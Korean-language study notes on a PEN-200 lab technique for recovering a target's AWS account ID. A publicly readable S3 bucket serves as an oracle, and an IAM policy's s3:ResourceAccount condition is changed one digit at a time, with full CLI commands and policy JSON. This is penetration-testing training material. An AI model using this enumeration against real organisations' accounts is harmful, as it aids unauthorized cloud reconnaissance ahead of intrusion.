# 25.3.3 S3 버킷에서 계정 ID 획득

> **Obtaining Account IDs from S3 Buckets** · PEN-200 §25.3.3

공개 공유된 리소스가 없어 앞 절 방식으로는 타겟의 계정 ID 를 못 얻는 상황이 전제임. 대신 **공개 읽기가 가능한 S3 버킷·객체가 하나만 있으면** IAM 정책의 `Condition` 을 오라클로 삼아 12자리 계정 ID 를 한 자리씩 복원할 수 있음.

**성립 조건 둘** — ⓐ 공격자 소유의 AWS 계정(IAM 사용자를 만들고 API 를 호출하기 위함) ⓑ 타겟 계정에 공개 읽기 가능한 버킷 또는 객체.

**원리** — 권한이 전혀 없는 IAM 사용자를 만들고, 버킷 나열·객체 읽기를 허용하되 「그 리소스를 소유한 계정 ID 가 x 로 시작할 때만 유효」라는 조건(`s3:ResourceAccount`)을 붙인 정책을 부착함. 그 사용자로 대상 버킷 나열을 시도해 **성공하면 자리 숫자가 x 로 확정되고, `AccessDenied` 면 다음 숫자로 넘어감.** 0~9 를 순회해 첫 자리를 잡고, 조건의 자릿수를 늘려 같은 절차를 반복하면 계정 ID 전체가 나옴. 즉 **접근 성공/거부가 곧 참/거짓 오라클**인 구조임.

AWS 특화 기법이지만, 「API 를 본래 용도 밖의 정보 추출에 쓴다」는 사고 자체는 다른 플랫폼에도 옮겨감.

**언제 펴는가** — 클라우드 대상 평가에서 타겟의 웹사이트가 S3 를 자산 저장소로 쓰는 것까지는 확인했으나 계정 ID 를 잡을 실마리가 없을 때. **대상은 버킷이 아니어도 됨** — 버킷 나열이 막혀 있으면 웹사이트 이미지처럼 공개 읽기가 되는 «객체» 하나로도 같은 판정이 성립함.

![[PEN200-Fig-320.png]]
*공개 S3 버킷·객체를 오라클로 써서 계정 ID 를 한 자리씩 알아내는 흐름*

**1단계 — 버킷 이름 확보.** 랩 버킷명은 `offseclab-assets-public-` 뒤에 무작위 영숫자 8자가 붙는 형태이고 **랩을 재시작할 때마다 바뀜.** 웹사이트 이미지 URL 에서 뽑아냄. `-s` 는 curl 의 진행 통계 출력 억제, `-P` 는 패턴을 perl-regexp 로 해석, `-o` 는 매칭된 부분만 출력.

```
kali@kali:~$ curl -s www.offseclab.io | grep -o -P 'offseclab-assets-public-\w{8}'
offseclab-assets-public-kaykoour
offseclab-assets-public-kaykoour
offseclab-assets-public-kaykoour
offseclab-assets-public-kaykoour
```

같은 값이 4번 나오는 것은 홈페이지의 이미지가 4개이기 때문임. 공개 여부는 AWS CLI 로 확인함 — 나열되면 모든 계정에 읽기를 허용하는 ACL·정책이 걸린 것으로 봄.

```
kali@kali:~$ aws --profile attacker s3 ls offseclab-assets-public-kaykoour
                           PRE sites/
```

**2단계 — 공격자 계정에 권한 없는 IAM 사용자 생성.** 새 IAM 사용자는 정책이 없으므로 기본적으로 모든 액션이 거부됨. 액세스 키를 함께 발급해 CLI 프로필로 등록함.

```
kali@kali:~$ aws --profile attacker iam create-user --user-name enum
{
    "User": {
        "Path": "/",
        "UserName": "enum",
        "UserId": "AIDAQOMAIGYU4HTPEJ32K",
        "Arn": "arn:aws:iam::123456789012:user/enum",
    }
}
kali@kali:~$ aws --profile attacker iam create-access-key --user-name enum
{
    "AccessKey": {
        "UserName": "enum",
        "AccessKeyId": "[REDACTED-AWS-KEY-ID]",
        "Status": "Active",
        "SecretAccessKey": "[REDACTED-AWS-SECRET]",
    }
}
```

프로필로 등록해 두면 이후 명령에 `--profile enum` 만 붙여 그 사용자로 행세할 수 있음. `sts get-caller-identity` 는 호출 주체의 UserId·Account·ARN 을 돌려줌.

```
kali@kali:~$ aws configure --profile enum
AWS Access Key ID [None]: [REDACTED-AWS-KEY-ID]
AWS Secret Access Key [None]: [REDACTED-AWS-SECRET]
Default region name [None]: us-east-1
Default output format [None]: json
kali@kali:~$ aws sts get-caller-identity --profile enum
{
    "UserId": "AIDAQOMAIGYU4HTPEJ32K",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/enum"
}
```

**랩 한정 변형 — 공개 버킷이 아니라 «비공개» 버킷을 대상으로 할 것.** 실제 공격에서는 enum 사용자가 공격자 계정에 있지만 랩에서는 enum 사용자와 타겟 버킷이 같은 계정에 있음. AWS 는 **같은 계정 안의 공개 버킷이라면 정책 없는 사용자에게도 읽기를 허용**하므로, 공개 버킷을 쓰면 오라클이 항상 「성공」이 되어 기법이 성립하지 않음. `offseclab-assets-private-…` 로 바꾸면 외부 계정에서 열거하는 상황이 재현되고 나머지 절차는 동일함.

```
kali@kali:~$ aws --profile enum s3 ls offseclab-assets-private-kaykoour
An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access
Denied
```

**3단계 — 조건을 건 정책 작성·부착.**

```
# policy-s3-read.json
{
     "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "AllowResourceAccount",
            "Effect": "Allow",
            "Action": [
                "s3:ListBucket",
                "s3:GetObject"
            ],
            "Resource": "*",
            "Condition": {
                "StringLike": {"s3:ResourceAccount": ["0*"]}
            }
        }
    ]
}
```

편집기로 작성한 뒤 `cat -n` 으로 행번호를 붙여 다시 읽으면 각 줄이 무엇을 하는지 짚기 쉬움.

```
kali@kali:~$ nano policy-s3-read.json
kali@kali:~$ cat -n policy-s3-read.json
     1  {
     2      "Version": "2012-10-17",
     3      "Statement": [
     4          {
     5              "Sid": "AllowResourceAccount",
     6              "Effect": "Allow",
     7              "Action": [
     8                  "s3:ListBucket",
     9                  "s3:GetObject"
    10              ],
    11              "Resource": "*",
    12              "Condition": {
    13                  "StringLike": {"s3:ResourceAccount": ["0*"]}
    14              }
    15          }
    16      ]
    17  }
```

허용 액션은 `s3:ListBucket`(8행)·`s3:GetObject`(9행)이고 `Resource` 가 `*` 라 어느 계정의 어떤 버킷·객체든 대상임. 실제 필터 역할은 `Condition` 하나뿐 — 리소스를 소유한 계정 ID 가 `0` 으로 시작할 때만 정책이 유효해짐(뒤는 와일드카드).

인라인 정책으로 붙임. `--policy-name` 은 참조용 이름이고, `--policy-document` 의 `file://` 접두사는 그 파일에서 JSON 을 읽으라는 지시임. **성공하면 출력이 없으므로** `iam list-user-policies` 로 부착 여부를 확인함.

```
kali@kali:~$ aws --profile attacker iam put-user-policy \
--user-name enum \
--policy-name s3-read \
--policy-document file://policy-s3-read.json
kali@kali:~$ aws --profile attacker iam list-user-policies --user-name enum
{
    "PolicyNames": [
        "s3-read"
    ]
}
```

**4단계 — 순회.** 랩 계정이 `123456789012` 라 `0*` 조건에서는 `AccessDenied` 가 나고, 파일을 `1*` 로 고쳐 다시 부착하면 나열이 성공함.

```
kali@kali:~$ aws --profile enum s3 ls offseclab-assets-private-kaykoour
An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access
Denied
kali@kali:~$ nano policy-s3-read.json
kali@kali:~$ cat -n policy-s3-read.json
     1  {
     2      "Version": "2012-10-17",
     3      "Statement": [
     4          {
     5              "Sid": "AllowResourceAccount",
     6              "Effect": "Allow",
     7              "Action": [
     8                  "s3:ListBucket",
     9                  "s3:GetObject"
    10              ],
    11              "Resource": "*",
    12              "Condition": {
    13                  "StringLike": {"s3:ResourceAccount": ["1*"]}
    14              }
    15          }
    16      ]
    17  }
kali@kali:~$ aws --profile attacker iam put-user-policy \
--user-name enum \
--policy-name s3-read \
--policy-document file://policy-s3-read.json
kali@kali:~$ aws --profile enum s3 ls offseclab-assets-private-kaykoour
                           PRE sites/
```

첫 자리가 확정되면 조건을 두 자리로 늘려 같은 식으로 반복함.

```
- __"StringLike": {"s3:ResourceAccount": ["10*"]}__
- __"StringLike": {"s3:ResourceAccount": ["11*"]}__
...
- __"StringLike": {"s3:ResourceAccount": ["18*"]}__
- __"StringLike": {"s3:ResourceAccount": ["19*"]}__
```

확정된 앞자리를 그대로 두고 뒤에 한 자리씩 붙여 나가는 방식이라, AWS 계정 ID 가 12자리인 점을 감안하면 자리마다 최대 10회 · 전체 120회 이내의 시도로 전부 복원됨. 정책 파일 한 줄만 바꿔 재부착하는 것이 시도 1회의 전부임.

⚠️ **정책은 적용 후 몇 초 뒤에야 유효해짐** — 시도마다 10~15초 기다린 뒤 판정할 것. 성급히 읽으면 맞는 숫자를 거부로 오독함. `aws --profile attacker sts get-caller-identity` 로 실제 계정 ID 를 미리 확인해 두면 기법이 제대로 도는지 대조할 수 있음.

**자동화** — 반복 구간이라 스크립트로 돌릴 수 있고 `s3-account-search` 같은 도구가 이미 구현해 둠(그쪽은 사용자 대신 역할에 조건 정책을 걺). 구현 방식은 여럿이지만 핵심은 하나 — **IAM 정책의 `Condition` 이 교차 계정 접근을 통제한다는 성질**임. S3 를 쓰는 것은 공개 읽기 객체를 찾기 쉬워서일 뿐, 다른 서비스로도 원리상 성립함.
